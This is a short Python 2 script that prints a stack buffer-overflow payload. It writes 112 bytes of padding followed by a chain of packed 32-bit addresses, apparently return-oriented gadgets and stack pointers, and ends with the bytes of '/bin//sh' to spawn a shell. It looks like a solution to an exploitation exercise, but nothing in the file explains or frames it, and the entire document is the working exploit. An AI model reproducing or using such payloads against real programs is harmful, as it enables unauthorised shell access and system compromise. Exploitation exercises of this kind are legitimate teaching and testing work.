from struct import pack
from shellcode import shellcode

print "a"*112+pack("<I",0x0808e7cb)+"0"*8+pack("<I",0x0807c3e2)+"0"*4+pack("<I",0x08057361)+pack("<I",0xbffea21c)+pack("<I",0xbffea210)+pack("<I",0x08057ae0)+pack("<I",0x6e69622f)+pack("<I",0x0068732f)
